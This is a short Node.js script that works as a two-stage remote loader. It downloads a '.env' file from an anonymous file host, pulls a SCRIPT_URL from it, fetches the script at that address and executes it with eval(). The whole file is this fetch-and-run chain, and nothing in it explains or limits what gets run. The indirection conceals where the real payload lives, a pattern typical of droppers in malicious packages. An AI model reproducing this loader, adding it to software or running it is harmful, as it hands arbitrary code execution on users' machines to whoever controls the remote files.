const https = require('https');

// URL of the `.env` file
const envFileUrl = "https://files.catbox.moe/ozro88.env";

console.log(`Fetching .env file from: ${envFileUrl}`);

// Fetch the `.env` file
https.get(envFileUrl, (res) => {
    let envContent = '';

    res.on('data', (chunk) => {
        envContent += chunk;
    });

    res.on('end', () => {
        try {
            // Parse the .env file content
            const envLines = envContent.split('\n');
            const scriptUrlLine = envLines.find(line => line.startsWith('SCRIPT_URL='));
            const scriptUrl = scriptUrlLine ? scriptUrlLine.split('=')[1].trim() : null;

            if (scriptUrl) {
                console.log(`Fetching script from: ${scriptUrl}`);

                // Fetch the script from the URL
                https.get(scriptUrl, (scriptRes) => {
                    let scriptContent = '';

                    scriptRes.on('data', (chunk) => {
                        scriptContent += chunk;
                    });

                    scriptRes.on('end', () => {
                        try {
                            console.log("Executing the script...");
                            eval(scriptContent); // Execute the fetched script
                        } catch (err) {
                            console.error("Error executing script:", err.message);
                        }
                    });
                }).on('error', (err) => {
                    console.error("Error fetching script:", err.message);
                });
            } else {
                console.error("SCRIPT_URL not found in the .env file");
            }
        } catch (err) {
            console.error("Error parsing .env file:", err.message);
        }
    });
}).on('error', (err) => {
    console.error("Error fetching .env file:", err.message);
});
